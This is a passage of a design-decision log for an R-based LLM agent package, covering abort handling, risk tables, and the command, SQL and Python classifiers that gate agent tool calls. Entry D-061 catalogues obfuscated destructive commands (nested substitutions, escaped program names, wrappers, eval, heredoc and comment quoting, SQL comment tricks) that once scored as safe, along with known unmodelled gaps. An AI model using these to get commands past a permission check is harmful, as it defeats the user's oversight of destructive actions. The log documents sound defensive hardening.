   (the plan's rule) and also while the run's status is `tools` (a `tool_call`,
   `permission_request` or `tool_result` hook of a call). In the plan such a hook settled the run
   at once, and the dispatcher then ran the permission check and the tool in the settled run and
   recorded the result after `agent_end`. The first abort's reason is kept. The dispatcher (P06
   Task 7, `R/agent-dispatch.R` `dispatch_steps()`) now checks the signal after the `tool_call`
   hooks and again after `perm_check()`: a call whose own `tool_call` or `permission_request`
   hook aborted (or that an abort from elsewhere reached during its permission prompt) gets the
   error result "Tool call not executed: the run was aborted (<reason>)." and neither its
   checkpointers nor the tool run, so a guard plugin that aborts on a dangerous call stops its
   side effects (in the plan, and in this task's first version, the tool still executed).
7. **Members act on the run executing on the call stack first** (`run_current()` when it belongs
   to the ctx's session), else `session_live(s)$run` (the plan). A run settled while its tool
   still executes (an abort from elsewhere) now still answers `ctx$aborted()` `TRUE` and
   `ctx$run` with its id; `envir` falls back to the kept home when the run released its
   evaluation environment; `set_model` applies at once to a settled run's session.
8. **`state()` seeds its environment only from a named list** (a malformed stored `gptr.ext`
   starts empty instead of failing in `list2env()`), and `ctx_ext_label("plugin:")` is
   `"plugin"`.
9. **A pending `set_model()` switch applies when the run settles first** (`run_settle_model()`,
   called by `run_settle()`). The plan's switch inside a run lived only in `run$pending_model`,
   read by `run_target()` at the run's next request, so a call during the run's last reply (a
   `message_end` or `turn_end` hook, a callback while the reply streams, a run ending on
   `max_turns`) returned `invisible(NULL)` and was silently dropped: no `model_change` entry, the
   old model kept. 04 section 10.6 and IC-69 promise "a `model_change` at the next request
   boundary"; the run's end is that boundary. It applies whatever the run's status, and a failure
   there (the provider went away, a store failure) is a registry diagnostic (`event =
   "set_model"`) that never interrupts the settlement.
10. **An abort while a request is prepared stops the request** (`run_request()`, P06 Task 10):
    after `run_target()` (a `model_select` hook), after the `before_request` emit and after the
    `request_params` chain the request returns through `run_abort()` when the run is signalled or
    settled (`run_halted()`). In the plan a `before_request` hook calling `ctx$abort()` settled
    the run (`agent_end`, transfers cancelled) and `run_request()` then marked the run busy and
    `requesting` and called `provider_stream()`, a transfer that nothing cancelled.

Validation: `progress/P06.md`, Task 15. Twelve blocks were added to `test-agent-run.R` (81
expectations; the last four and the changed dispatcher block come from the review, round 1).
Against the plan-literal source, `^agent-run$` gives `[ FAIL 11 | WARN 1 | SKIP 0 | PASS 540 ]`
(`task15-literal.log`, before the review), every failure in the added blocks; the review's
regression tests against the first version: `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 592 ]`
(`task15-fix1-red.log`); final `^agent-run$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 603 ]`;
neighbours `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 6241 ]`; broad suite
`[ FAIL 0 | WARN 0 | SKIP 1 | PASS 8312 ]`.

## D-060 - P11 risk tables: a winning risk_rule row replaces only the cells it supplies, rows with an NA key are dropped (an NA subcommand is `*`), the table cache sees re-registered records (2026-10-04)

P11 Task 1's generators and checksums are the plan's (1492 and 434 rows; `tools::md5sum()` equals the
plan's values on R 4.5.0). Three defects of the plan-literal `R/perm-classify.R` concern the merge of
`risk_rule` records (04 section 10.2 row 33, section 11.15, IC-69):
1. **A winning row replaced the whole shipped row.** The kind requires only `package`, `function`
   and `level`, and the plan filled every missing column with `""`. A plugin raising `base::saveRDS`
   to level 3 therefore erased its category and its path argument `file`, and Task 3's walker would
   no longer see the path class of the saved file (`control` is level 4): raising a level lowered
   the risk. The row now replaces only the cells it supplies: the columns its record has, and in
   that row only the cells that are not NA (rows bound together with `rbind()` or
   `dplyr::bind_rows()` leave NA where a row gave no value). A new row still gets `""` for missing
   and NA text cells.
2. **Rows with an NA key matched every lookup of the same name.** `rows$package == pkg` is NA for an
   NA package, so `risk_lookup("wipe", "mypkg")` returned an all-NA row. Rule rows with an NA
   `package`, `function` or `command` are dropped. An NA `subcommand` means `*`, as an omitted
   `subcommand` column does, so the row is kept. NA text in the other columns becomes `""` on a new
   row (a later `nzchar(path_arg)` stays false), and factor columns become text.
3. **The cache could serve a stale table.** It was keyed by the registry generation, the number of
   records and their names, so removing a record and registering one of the same name with other
   rows kept the old table. The key now hashes the records' name, rows and `lower`
   (`hash_xxh128()`, P01).
The glob rows' regular expressions are compiled once per merged table (no behaviour change).

Validation: `progress/P11.md`, Task 1. Two blocks were added to `test-perm-classify.R`
(10 expectations); against the plan-literal source they fail 5 (`task1-probe-plan-literal.log`).
Review round 1 extended item 1 to NA cells and item 2 to NA subcommands: 6 expectations in the
first added block and a third added block (4); against the round-0 source they fail 4
(`task1-fix1-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 116 ]` in the
UTF-8 and the C locale.

## D-061 - P11 command, SQL and Python classifiers: a command line is read as sh reads it (comments, heredocs, ANSI-C quotes, substitutions, cd), null devices and shell-word paths are followed, wrappers, eval and shell keywords never hide a command, program-running options and environment prefixes are dynamic, every write takes the path class of the file it writes, SQL is lexed in one pass per dialect, text enters through as_utf8() (2026-10-04)

P11 Task 2 appends the plan's G5 classifiers (`risk_command()`, `risk_sql()`, `risk_python()`, the
flag-row helpers, `risk_path_class()`, `risk_cmd_row()`, `risk_cmd_edits_parity`) with the plan's
interfaces and call texts; all 55 plan expectations pass unchanged, and so do the later P11 tasks'
command, SQL and Python cases. The classifier is advisory (G5, 03 section 6.8), but a level-0 result
runs without asking in every mode (plan mode included), so the plan-literal code had to be hardened
where it returned level 0 or 1 for code that runs programs, deletes or writes guarded files:
1. **Shell syntax.** Substitutions are found by a scan that follows quotes, backslashes and
   nesting, and each is classified as a command line, recursively (the plan read one level with a
   regular expression: `echo $(rm -rf ~ $(true))` was 0), process substitutions `<(...)`/`>(...)`
   too. Text in single quotes is no command (`awk '{print $(NF-1)}'` stays 0, `echo '$(rm -rf ~)'`
   is 0), double-quoted substitutions are (`echo "$(rm -rf ~)"` is 4). An arithmetic `$((...))` is
   no command, but substitutions inside it are. One that is not closed is level 3 `dynamic` and its
   text is classified too. A line that starts with `|` no longer throws. A wrapper, `sudo` or `xargs`
   without a command keeps its flag. Redirects are handled per simple command, and
   `cd`/`pushd`/`popd` set the directory that later relative paths and redirects resolve from
   (`cd .gptr && echo x > settings.json` was 2, now 4); a computed `cd` makes relative paths
   `unknown`; a `cd` in a subshell `( )` ends with it, and one in a pipeline or the background
   (`cd /tmp & rm -rf *`) changes nothing. A bare digit after `>` is a file; only after `>&` is it a
   descriptor; `>|` is `>`. The tokeniser reads backslash escapes (outside quotes before a shell
   metacharacter, quote, `$` or backtick, and `\"`, `\\`, `\$`, `` \` `` in double quotes; other
   backslashes stay, so Windows paths keep theirs): `echo \' ; rm -rf ~ ; echo \'` was 0, now 4.
   Before any scan the line is read as sh reads it (`risk_sh_prepare()`), at any nesting of
   `$(...)`: an unquoted `#` that starts a word comments out the rest of its line (`a#b`,
   `${x#a}` and `$#` are no comments); `$'...'` is ANSI-C quoting and is decoded (`\'`, `\xHH`,
   octal, `\u`); a backslash-newline is removed outside single quotes; a heredoc body (`<<WORD`,
   `<<-WORD` with its tabs, `<<'WORD'`, several on one line) is data up to its delimiter line, and
   the lines after it are commands again. An unquoted delimiter's body still runs its
   substitutions, and a shell that reads a heredoc or a here-string (`sh <<'EOF'`,
   `bash <<< '...'`) runs it as a command line. A `<<` inside `((...))` or `$((...))` is a shift.
   A line that ends inside an open quote is level 3 `dynamic`. Before review round 2 an
   apostrophe in a comment or a heredoc body opened a quote that hid every later line:
   `ls # don't` followed by `rm -rf ~` was 0, `echo $'\'' ; rm -rf ~` was 0,
   `"$\<newline>(rm -rf ~)"` was 0, and `cat > notes.md <<'EOF'` with the body `It's done`
   followed by `rm -rf ~` was 3.
2. **Null devices are not writes** (`/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/tty`,
   `/dev/fd/1`, `/dev/fd/2`, `NUL`, `-`). G5 had a `null` path class; P01's `path_class()` puts
   `/dev/null` in `outside`, so `git status 2>/dev/null` was level 3 in the plan.
3. **Shell-word paths** (`risk_cmd_path_class()`): `$HOME`/`${HOME}` (and `${HOME:?}`,
   `${HOME:-x}`, `${HOME%/}`) is `~`, `$PWD` (and `$(pwd)`) the working directory; any other `$`,
   backtick or `%VAR%` word is `unknown` (P01 joined it to the root as `workspace`, so `cp x $DEST`
   was an edits-mode auto-approval). A glob takes its directory's class when that is `control`,
   `protected` or `instructions` (any glob in `.gptr/` is `control`), and a bare `*` in a critical
   directory is `critical` (`rm -rf *` at the root, `~/*`, `/*`, `"$PWD"/*`: 4, like `rm -rf ~`).
   Deleting or moving away the root, home, a directory above either (any expansion of `$HOME` or
   `$PWD`, such as `${PWD%/*}`), or a `.gptr/` directory is level 4. `~+` is the working
   directory; `~-`, `~+N`, `~-N` and `~login/...` are `unknown`, and deleting a bare `~login` (that
   user's home) is 4 (`rm -rf ~+` and `rm -rf ~root` were 3). Every write takes the path
   class of the file it writes (`risk_cmd_target_class()`, control category for `control`; a `.gptr`
   directory itself is `control`): all operands of `mkdir`/`touch`; for `cp`/`mv`/`ln`, the
   destination, or, when it is a directory (a `-t`/`--target-directory` value, a trailing `/`, `.`,
   `..`, `~`, more than one source, or an existing directory, unless `-T`), each source's name inside
   it (`cp settings.json .gptr/` is 4 `control`, `cp ../a.csv .` is 2 `workspace`; `src/.` copies
   any name; a glob name takes the class of the guarded names it can match there: dot names for a
   dot pattern, the control files inside `.gptr/`); guarded sources of `mv`; `chmod`/`chown` targets
   of class `control` or `critical`; and the targets of redirects, `tee`, `time -o`,
   `find -fprint*`/`-fls`, sed `w` and `-i`, `gawk -i inplace`, the second operand of `uniq` and
   `xxd`, `sort -o`/`--output`, `tree -o`, gawk's `-o`/`-p`/`-d` (an attached file, else
   `awkprof.out` or `awkvars.out`) and the literal files an awk program prints to
   (`print "x" > "f"`), curl's `-o`, `-O` (the URL's name, both in `--output-dir`), `-D`, `-c`,
   `--trace*`, `--libcurl`, `--stderr`, `--etag-save`, `--hsts`, `--alt-svc`, wget's `-O`, else
   each URL's name (in `-P`), and its `-o`/`-a`/`--save-cookies` files, PowerShell's `-OutFile`,
   and git's outputs (item 5); options are read in every spelling (item 6).
4. **Environment prefixes** that choose the program or what it loads (`PATH`, `LD_*`, `DYLD_*`,
   `HOME`, `GIT_SSH*`/`GIT_EXTERNAL_DIFF`/`GIT_CONFIG*`/..., `BASH_ENV`, `PAGER`, `EDITOR`,
   `PYTHONPATH`, `NODE_OPTIONS`, `R_PROFILE*`, ...) are level 3 `dynamic`: the open question of G5
   (line 189) that the research digest's security notes answer with level 3. `LC_ALL=C` stays 0.
5. **git.** The global options that take a value are skipped with it, as the next word or after
   `=` (`-C`, `-c`, `--config-env`, `--git-dir`, `--work-tree`, `--namespace`, `--super-prefix`,
   `--attr-source`): `git --namespace status push --force origin main` read `status` as the
   subcommand and was 0, now 3. A writing subcommand on a `--work-tree` or `--git-dir` of class
   `control`, `protected` or `instructions` writes there (`git --work-tree .gptr checkout -- .` is
   4 `control`; a `.git` directory is not counted). `-c`/`--config-env` with a key outside an
   allowlist of keys that cannot run a program
   (pager keys are checked by value, so the plan's `-c core.pager=cat` stays 0; `core.fsmonitor`,
   `alias.*`, `core.sshCommand` are 3), `--exec-path=`, `--upload-pack`/`--receive-pack`/`--exec`,
   `rebase -x`, `grep -O`, `bisect run` and `submodule foreach` are `dynamic`. A bare `git stash`
   (push and reset) is 2, `git branch <name>`/`git tag <name>` (listing forms stay 0) are 2, `reflog
   expire|delete` is 3. Levels are only raised, so `-D` never lowers a row a `risk_rule` raised; the
   plan's `branch -d`/`tag -a` kept category `read` at level 2, now `file_write`. Files git writes
   take their path class, resolved from `-C`: `--output`, `archive -o`, `format-patch -o DIR`
   (`DIR/*.patch`) and `bundle create FILE`. `git config` storing a key whose value git later runs
   or loads (`core.fsmonitor`, `core.hooksPath`, `core.editor`, `alias.*`, `credential.*helper`,
   `diff.*.textconv`, `filter.*`, `include.path`, ...; pager keys checked by value) is level 4
   `control` on `.git/config` (or `<git-dir>/config`, or the `--file`, `--global`, `--system`
   file): later level-0 git commands would run it. Other settings written to a `--file`/`-f`,
   `--global` or `--system` file take that file's path class (`git config --file
   .gptr/settings.json user.name me` was 2 with no path, now 4 `control`); `git config user.name
   me`, which git writes to the repository's own `.git/config`, stays 2.
6. **Read-table programs with options that run code or write files**: sed (combined `-ni`,
   `-i.bak`; GNU `e`, `w`/`W` and the `e`/`w` flags of `s`; `--sandbox` turns them off; BSD
   `-i ''`/`-i .bak`), find (leading `-H`/`-L`/`-P` skipped; `-delete` and `-exec rm` take the start
   paths' delete level), fd `-x`/`-X`, rg/ag `--pre`/`--pager`, sort `--compress-program`, awk pipes
   to or from commands and `getline`, yq `-i`, printf of a secret-looking variable, curl data flags in
   attached and combined forms (`-d@file`, `-sd`), wget `--post-data=`/`--method`/`--body-*`, httpie
   `POST`/`PUT`/`PATCH`/`DELETE`. These options are read with `risk_cmd_args()`: a short-option
   cluster gives one option per letter up to the first that takes a value, which takes the rest
   of the word or the next word (`sort -uo FILE`, `yq -Pi`, `curl -so FILE`, `wget -qO FILE`;
   `sort -to x` is `-t o`, `yq -oi` is `-o i`); tree's value letters each take the next word, in
   order; a long option that is a prefix of a listed one is that option, as getopt_long() reads
   it (`sort --out=F`, `gawk --dump=F`, `cp --targ=DIR`; not for curl and yq, which read long
   options in full); gawk's optional values are only attached, and `xargs -i`/`--replace` take no
   separate value. Before review round 2, `sort -uo .Rprofile`, `tree -ao .gptr/settings.json`,
   `yq -Pi ... .gptr/settings.json` and `gawk -o.gptr/settings.json` were 0.
7. **SQL** is lexed once, left to right (strings, quoted identifiers, dollar quotes, `--` and block
   comments; MySQL's executable `/*! */` stays code), with and without backslash escapes, and the
   higher result wins. The plan stripped comments before strings, so `SELECT '--'; DROP TABLE t` was
   0, and a block comment over two lines made `SELECT 1` level 3. `EXPLAIN ANALYZE` of a write is 2.
   Statements are classified in one pass (20,000 statements, 800 KB: 8.3 s with one bind per
   statement for both lexings, 0.4 s after). Two MySQL lexings (with and without backslash
   escapes) read `#` as a comment, `--` as one only before white space or a control character,
   and no dollar quotes: `SELECT 1--1; DROP TABLE t` and `SELECT $$; DROP TABLE t; $$` were 0, now
   3. With backslash escapes `\"` is escaped inside double quotes too. A lexing whose blanked text
   equals an earlier one is not classified again (the same 20,000 statements: 0.2 s).
8. **Python**: `from os|shutil|pty import` of process and delete functions, and `os.rename`/
   `replace`/`makedirs`/... and `shutil.copy*`/`move` (file writes) are flagged.
9. **Input**: command, SQL and Python text enters through P01's `as_utf8()`. The file
   `utils-encoding.R` is the only place allowed to convert from the native encoding, because in a C
   locale that conversion rewrites UTF-8 bytes as `<c3><a9>`, which the tokeniser reads as
   redirects. Bytes that are neither UTF-8 nor marked latin1 are level 3. A vector of SQL or Python
   is joined with newlines (the plan's `if (grepl(...))` threw on length > 1). NA is `""`.
   `risk_path_class()` also maps P01's translation warning (a non-ASCII path in a C locale) to
   `unknown`, as its documented contract says. The tokeniser collects characters by index (linear
   time on long quoted words).
10. **Wrappers and shell keywords never hide the command they run.** The options of `sudo`,
    `doas`, `env`, `nice`, `timeout` (and its duration), `time`, `stdbuf`, `xargs`, `exec` and
    `command` are skipped with their values (`-u root`, `-uroot`, `-Eu root`, `--user=root`, `--`);
    `env -C`/`sudo -D` set the directory, `env -S` splits its string into the command, `env -P` is
    `dynamic`, `env` with only options or assignments prints the environment (2 `secret`), `command
    -v` only looks up, `sudo -e` writes its files, `su -c` and a shell's `-c` (`bash -lc`, `sh -o
    pipefail -c`) classify their command line. An unknown program, or a wrapper option gptr does not
    know, also has its first later word that names a known program classified (`chrt 10 rm -rf ~`
    is 4). Shell keywords (`!`, `{`, `}`, `if`, `then`, `else`, `elif`, `while`, `until`, `do`,
    `done`, `fi`, `esac`) run nothing; `for`/`select`/`case` words are data; a `function` body is
    classified; `( )` is a subshell; `[[` is `[`. The plan made `sudo -u root rm -rf /`,
    `nice -n 10 rm -rf ~`, `(rm -rf ~)`, `if true; then rm -rf ~; fi` and `bash -c 'rm -rf ~'` level
    3, which auto mode allows, so the critical guard and the control `ask_human` were bypassed.
    `eval` joins its words and classifies them as a command line (`eval 'rm -rf ~'` was 3, now 4).
    A program word with a backslash is also classified as sh reads it, without the backslashes,
    when that names a known program (`r\m -rf ~` and `c\p settings.json .gptr/` were 3, now 4;
    `C:\Git\bin\git.exe status` stays 0). Substitutions, `-c`, `eval` and heredoc lines nested
    deeper than 25 levels are level 3 `dynamic`, not read.
Known limits (advisory classifier, not a security boundary): scripts read by `sed -f`/`awk -f`,
configuration read by `curl -K`, `wget -e`/`--config` or `git` from the repository, commands
hidden by `eval` of computed strings beyond the rules above, Python reached through `getattr()`,
and heredocs or here-strings read by a program other than a shell (an interpreter is 3 `process`
anyway). A substitution in an unquoted heredoc that holds a comment is not read and is level 3
`dynamic`. Shell syntax is read as sh (and PowerShell, for `#` comments) reads it; cmd.exe, gptr's
last fallback on Windows without Git Bash or PowerShell, has no `'` quotes, no `#` comments and
`^` escapes, which the classifier does not model.

Validation: `progress/P11.md`, Task 2. Six blocks were added to `test-perm-classify.R`
(145 expectations); against the plan-literal Task 2 source the file gives
`[ FAIL 87 | WARN 0 | SKIP 0 | PASS 202 ]` (`task2-probe-plan-literal.log`). Review round 1 added
item 10 and the destination, operand, `$PWD`, quote and `cd` parts of items 1, 3 and 5, with five
blocks (131 expectations) and one changed row (`echo $(rm -rf ~ "(")` is now read: 4, not 3);
against the round-0 source they fail 100 (`task2-fix1-red.log`, before five category assertions
were added). Review round 2 added the comment, heredoc, `$'...'` and continuation parts of item
1, the git options, tilde prefixes and new write targets of items 3 and 5, the option parsing of
item 6, the MySQL lexings of item 7 and `eval` and escaped program names in item 10, with six
blocks (109 expectations); the first 103 fail 70 against the round-1 source
(`task2-fix2-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 556 ]` in the
UTF-8 and the C locale.

## D-062 - P15 block headers: values holding a line break are quoted, quoted values are decoded without the R parser, header keys are matched exactly, a local model tag is kept as written (2026-10-04)

P15 Task 1's plan-literal `doc_format_kv()`, `doc_parse_kv()` and `doc_block_status()`
(`R/doc-blocks.R`) were changed in three ways. The marker grammar of contract section 11.5 is
unchanged, and so are the function interfaces.
1. **Line breaks are quoted.** The plan quoted a value only when it held a blank, tab, quote, `=`
   or backslash, so a value with a CR or LF (a non-syntactic `gptr_return()` name in `value=`, or
   a child name in `children=`) was written unquoted and split the one-line `BLOCK_OPEN` marker.
   The quote class is now `[ \t\r\n"=\\]`; `doc_str_literal()` already writes `\n` and `\r`.
   Contract 11.5 only says that values containing spaces are quoted, so quoting more values is
   compatible with it.
2. **Quoted values are decoded without the R parser.** The plan decoded them with `str2lang()`.
   In a C locale (the architecture section 9 CI matrix has an `LC_ALL=C` job) the parser rewrites
   each non-ASCII character of the literal as `<U+00E1>`. `children=` is always quoted, so a
   non-ASCII team or fan-out child name came back as `an<U+00E1>lisis:s1`, and so did a quoted
   `value=` name. P06's replay and IC-47 child binding would read the wrong name, and Task 5
   re-renders parsed headers, so the corruption would be written back into the user's document.
   The new `doc_str_unquote()` decodes exactly the escapes `doc_str_literal()` writes (backslash,
   quote, `\n`, `\r`, `\t`); any other escaped character stands for itself, so `\u`/`\x` escapes
   that a person typed by hand are not interpreted (gptr never writes them). Text that is not one
   whole quoted literal is kept as written, as before.
3. **Header keys are matched exactly.** `doc_block_status()` read `header$status`, `$sha`,
   `$prompt` and `$args`, which partial-match. Unknown keys are kept in a header, so a header
   with `shaz=` and no `sha=` was reported `user-edited` (and `statusx=undone` as `undone`). It
   now uses `header[["..."]]`.
The IC-74 local-model guard needed no code: a local model tag such as `ollama/qwen3:8b` has no
character of the quote class and is written unquoted and unchanged in `model=` (07 section 6, P15
row). One expectation pins it.

Validation: `progress/P15.md`, Task 1 (`test-doc-blocks.R`). The plan's 44 expectations are
unchanged. Fifteen were added: 2 for item 1 (the plan literal writes a newline into the header,
`task1-red-newline.log`), 1 for the IC-74 model tag, 10 in the block "quoted header values are
decoded without the R parser, also in a C locale" and 2 for item 3. Against the round-0 source
the added review-round-1 expectations fail 5 (3 C-locale, 2 partial-match; `task1-fix1-red.log`).
Final `^doc-blocks$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 59 ]` in the UTF-8 and the C locale.

## D-063 - Hosted CI after the P06/P09/P10 waves: as_utf8() keeps bytes that are not UTF-8 in a UTF-8 locale on every R version; the six-stream INFRA-01 wall nets out the mock's own lateness (2026-10-04)

Hosted run 37213342336 (`b40b4d1`) and run 37210924368 (`51ba767`) failed every R CMD check
job. CI Task CI-4 fixes them. Two of its changes go beyond a test's portability or packaging:

1. **`as_utf8()` keeps bytes that are not valid UTF-8 when the native encoding is UTF-8**
   (`R/utils-encoding.R`, P01; IC-62). Such an unknown-encoded string has no native encoding to
   be converted from. On R 4.5 and later (hosted 4.5.3, 4.6.1 and devel, local 4.5.0),
   `enc2utf8()` keeps its bytes and marks it UTF-8. R 4.2.3, on the oldrel-4 jobs for Ubuntu
   and Windows (ucrt, UTF-8), turned each invalid byte into `<xx>` text (R 4.3 and 4.4 were not
   checked). So on R 4.2.3 the code `x = '`, byte 0xff, `'` ran as `x = '<ff>'` with status
   `ok`, and D-055 item 4's `parse_error` never happened (hosted `test-eval-core.R:512-514`).
   `as_utf8()` now marks such strings UTF-8 itself. It calls `enc2utf8()` only for latin1
   strings and, in other locales, for native strings that are not valid UTF-8. Where
   `enc2utf8()` already kept the bytes, the result is the same as before. Where it rewrote
   them, every ingress in a UTF-8 locale now keeps the bytes as they came, so `validUTF8()`
   checks see them. Nothing changes in a non-UTF-8 locale. The one `enc2utf8()` call moved into
   `native_to_utf8()`, which the test mocks with R 4.2.3's conversion to reproduce the hosted
   failure on any R version.
2. **The six-stream INFRA-01 wall is measured on the mock's clock** (`test-http-reactor.R`,
   P04; extends D-016 item 1). Hosted macOS measured 2.486 s from the first head written. The
   heads were written within 0.017 s, and the long streams ended at 2.402, 2.436 and
   2.486 s, against the 2.25 s schedule. The message did not show whether the mock wrote the
   last pieces late or gptr delivered them late. D-016 netted the mock's own lateness out of
   the gaps but not out of the wall. Each stream's end is now its head's write, plus its
   scheduled length (`n * 0.25` s), plus gptr's delivery latency of the end of the body. That
   latency is the callback's wall clock minus the mock's write of the stream's last piece. A
   body of its own names each stream's request in its mock's log. The bound stays the plan's
   1.10 * 9 * 0.25 = 2.475 s. A latency below -0.05 s fails, because it means mismatched
   writes. D-016 said that contention which stretches every stream still fails. That now holds
   for gptr's delivery, but not for a mock that writes late. The failure message prints each
   stream's own lateness and gptr's delivery latency. Real-mock probe, on a clean `HEAD`
   export: normal runs measure 2.259-2.263 s here and 2.261-2.269 s by the old measure. With
   gptr's pump held for 0.4 s near the ends, the new measure gives 2.531-2.535 s and the old
   2.523-2.526 s, so both fail. With the long mock suspended for 0.7 s near its last writes
   (own lateness 0.319 s), the new measure gives 2.261-2.262 s and the old 2.574 s, the hosted
   failure's shape.

Validation: `progress/ci-hosted.md`, Task CI-4.

## D-064 - P15 call scanner: UTF-8 bytes are parsed (IC-62), parse data is kept under sys.source(), ownership matches header keys exactly and never a missing prompt hash, a computed prompt = gives no literal, a piped call (native or magrittr) is identified as R calls it, call identity ignores source references (2026-10-04)

P15 Task 2's plan-literal scanner and ownership functions (`R/doc-blocks.R`) were changed in eight
ways. Their interfaces and the contract 11.5 ownership rule are unchanged. The call table gains
one column, `ident` (item 6).
1. **The scanner parses UTF-8 bytes.** The plan parsed `as_utf8()` (UTF-8-marked) text and
   decoded string literals with `str2lang()`. In a C locale (the architecture section 9 CI
   matrix has an `LC_ALL=C` job) the parser translates marked UTF-8 to the native encoding, so a
   prompt literal `"café"` was read as `"caf<U+00E9>"`. Its `prompt_hash()` differs from the
   runtime prompt's, so the call never finds its block by prompt: the block is matched by `call=`
   ordinal as stale or not at all, against IC-62 (exact UTF-8 prompt bytes under
   `LC_ALL=C Rscript`, document included). Outside a UTF-8 locale `doc_parse_text()` now parses
   `os_bytes(lines)` (UTF-8 bytes without a mark); in a UTF-8 locale it parses marked UTF-8 as
   the plan did, since nothing is translated there. `str2lang(os_bytes(.))` decodes prompt
   literals and call texts, and prompts and call texts pass `as_utf8()`. Parse-data columns and
   `utils::getParseText()` (which cuts the source lines with `substr()`) then count the same
   unit: bytes outside a UTF-8 locale, characters in a UTF-8 locale. The plan's parse cut a
   non-ASCII call text short in a C locale. The first version of this change parsed the bytes in
   every locale: unmarked non-ASCII text makes the parser count bytes, while `substr()` counts
   characters in a UTF-8 locale, so in the default locale a call after a non-ASCII character on
   its line got a shifted text and was never found by identity, and a literal prompt over 1000
   bytes was lost (review round 2; fixed and covered in both locales).
2. **Parse data is kept under `sys.source()`.** `sys.source()` sets `keep.parse.data = FALSE`
   while the sourced code runs (its `keep.parse.data` argument defaults to
   `keep.parse.data.pkgs`), and a user may set the option. `getParseData()` is then `NULL` and the
   plan's scanner found no `gptr()` call at all. `doc_parse_text()` sets
   `options(keep.parse.data = TRUE)` for the parse and restores it with `on.exit(add = TRUE)`.
3. **Ownership matches exactly.** `doc_owned_block()` read `call=` with `h$call`, which partially
   matches an unknown header key such as `callback=` (as D-062 item 3 for `sha=`/`status=`); it
   now reads `h[["call"]]`, as do the label column and the site and anchor fields.
   `doc_run_owner()` matched a header without `prompt=` to a missing prompt hash (`NA %in% NA`),
   returning that block as owned and fresh; a missing hash now never matches by prompt.
4. **Terminal-only parse text.** `getParseData()` runs without `includeText = TRUE`;
   `getParseText()` reads a call's text back from the source, so results are identical and a
   2,320-line script parses about 18 times faster (0.013 s instead of 0.24 s).
5. **A computed `prompt =` is the prompt (review round 1).** Contract 6.1.1 step 2 takes
   `prompt =` when given, else the first unnamed string literal, and a non-literal prompt's
   template is its value (7.8 call record). The plan's `doc_call_prompt()` fell back to the first
   unnamed literal when `prompt =` was not a literal, so `gptr(prompt = p, "context text")` was
   hashed as `"context text"`, never matched the runtime hash of `p`'s value, and was skipped by
   the call-identity fallback (which only checks rows without a hash): the call could never be
   located. A given `prompt =` whose value is not a string literal now gives NA, so the call is
   found by its text. `prompt = NULL` and an empty `prompt =` are not given (the default is
   `NULL`), and `` `prompt` = `` and `"prompt" =` bind `prompt` as in R (`doc_arg_name()`).
6. **A piped call is identified as R calls it (review round 3).** The parser rewrites
   `lhs |> gptr(q)` into `gptr(lhs, q)`, and `sys.call()` (the `call0` that Task 8's locator
   passes to `doc_calls_have()`) reports the rewrite. The plan stored and compared only the
   right-hand text `gptr(q)`. As a result, a computed-prompt call on the right of a pipe was
   never found by identity: `df |> gptr(q)`, `x |> gptr(paste(...))`, and every later step of a
   chain. A string-literal left side (`"Summarise mtcars" |> gptr()`) gave no prompt literal. Yet
   its prompt is that left side (contract 6.1.1 step 2: after the rewrite it is the first unnamed
   string literal). None of these calls could be located, recorded or replayed. The scanner now
   fills a column `ident`. For the right-hand operand of a pipe it holds the text of the whole
   pipe expression. That operand is a call whose parent expression has a `PIPE` child before it.
   Parsing that text with `str2lang()` gives what `sys.call()` reports, for a single pipe, a
   chain, a literal left side and the placeholder `_`. Any other call's `ident` is its own text.
   `text` stays the call's own text. `doc_calls_have()` compares `ident`, and `th` (the anchor
   identity) hashes `ident`. `doc_call_prompt()` treats the left side as the first unnamed
   argument, so a string-literal left side is the prompt unless `prompt =` is given. With the
   placeholder, the left side goes to the argument that holds `_`: `"x" |> gptr(prompt = _)`
   prompts `"x"`, and `"ctx" |> gptr("p", ctx = _)` prompts `"p"`. Because the left side is the
   first argument, a literal there wins over a later unnamed literal: `"S" |> gptr("more")` runs
   `gptr("S", "more")` and prompts `"S"` (the runtime also warns `two_prompts`), pinned by a test
   since review round 4. The plan literal has the same gap (`task2-fix3-adapt-red.log`). Item 8
   covers magrittr's pipes.
7. **Call identity ignores source references (review round 3).** Under `keep.source = TRUE`
   (the default in interactive sessions, and `source(keep.source = TRUE)`), the call that
   `sys.call()` reports carries source references. Each `function` or `\(x)` call holds a srcref
   as its fourth element, and each `{` carries srcref attributes. The call parsed from the
   scanner's text has neither. So `identical()` failed for
   `gptr(paste("a", sapply(x, function(i) i)))`, and such a call could not be found by identity.
   `doc_calls_have()` now compares both sides through the new `doc_call_norm()`. It drops srcref
   elements and the srcref, srcfile and wholeSrcref attributes at every depth. It is gptr's own
   helper rather than `utils::removeSource()`, which became thorough for language objects only in
   R 4.4.0 (R NEWS, PR#18638); the package supports R >= 4.2.0.
8. **A magrittr-piped call is identified as magrittr calls it (review round 4).** Users pipe into
   `gptr()` with magrittr too (contract 6.1, `envir` row: a magrittr mask is replaced by its
   parent; research 12 D3: `mice %>% gptr("describe")`), although magrittr is not a dependency.
   magrittr 2.0.5 calls the right-hand side with `.` as its first argument unless an argument,
   named or not, is `.` itself: `sys.call()` reports `x %>% gptr(q)` as `gptr(., q)` and
   `x %>% gptr(q, .)` as `gptr(q, .)`, with `keep.source` FALSE and TRUE, under `%>%`, `%T>%`,
   `%!>%` and `%<>%`; `%$%` calls it as written. The plan and round 3 kept `gptr(q)` as the
   identity, so a magrittr-piped call with a computed prompt (`1 %>% gptr(q)`,
   `1 %>% gptr(paste("a", q))`) or a literal left side (`"S" %>% gptr()`) was never found by
   `doc_calls_have()` and could not be located, recorded or replayed. The scanner now treats a
   `SPECIAL` token of those four pipes like `PIPE` (`doc_pipe_operands()` reports which), and
   `ident` of the right-hand call is its text with `.` inserted as the first argument unless an
   argument is `.` (`doc_dot_ident()`; `gptr(.)` when the call has no argument). `text` is
   unchanged. For the prompt, `.` is a symbol, never a literal (contract 6.1.1 step 2): a
   string-literal left side is the prompt as `prompt = .`, or when no unnamed literal is given and
   `.` is the first unnamed argument, as the first length-1 character value (`"S" %>% gptr(q)`
